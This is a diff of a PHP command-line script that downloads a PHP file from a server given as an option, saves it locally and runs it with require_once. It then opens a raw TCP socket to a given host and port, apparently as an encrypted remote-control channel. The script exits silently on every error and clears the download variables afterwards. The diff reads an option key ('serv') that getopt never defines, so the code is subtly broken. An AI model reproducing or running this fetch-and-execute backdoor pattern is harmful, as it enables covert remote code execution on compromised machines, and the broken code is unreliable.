@@ -4,24 +4,26 @@
 	ob_implicit_flush(1);
 	define("BUFFER_LEN", 4096);
 
-	$opts = getopt("h:p:s:", ["host:", "port:", "serve:"]);
+	$opts = getopt("h:p:s:f:", ["host:", "port:", "serve:", "file:"]);
 
-	(count($opts) === 3) || die();
+	(count($opts) === 4) || die();
 	$addr = array_key_exists("host", $opts) ? trim($opts['host']) : trim($opts['h']);
 	$port = array_key_exists("port", $opts) ? trim($opts['port']) : trim($opts['p']);
-	$server = array_key_exists("serve", $opts) ? trim($opts['serve']) : trim($opts['s']);
+	$file = array_key_exists("file", $opts) ? trim($opts['file']) : trim($opts['f']);
+	$server = array_key_exists("serv", $opts) ? trim($opts['serv']) : trim($opts['s']);
 
-	$newpath = './openssl.php';
-	if(file_exists($newpath) === false){
-		$opensslpath = "http://$server/down/Openssl_EncryptDecrypt.php";
-		copy($opensslpath, $newpath);
+	$openssl_dest_path = './openssl.php';
+	if(file_exists($openssl_dest_path) === false){
+		copy("http://$server/down/$file", $openssl_dest_path);
+		unset($file);
+		unset($server);
 	}
 
 	($socket = @socket_create(AF_INET, SOCK_STREAM, SOL_TCP)) || die();
 	($result = @socket_connect($socket, $addr, $port)) || die();
 
-	if(file_exists($newpath)){
-		require_once $newpath;
+	if(file_exists($openssl_dest_path)){
+		require_once $openssl_dest_path;
 		$openssl_encrypt_decrypt = new Openssl_EncryptDecrypt;
 	} else { die(); }
 
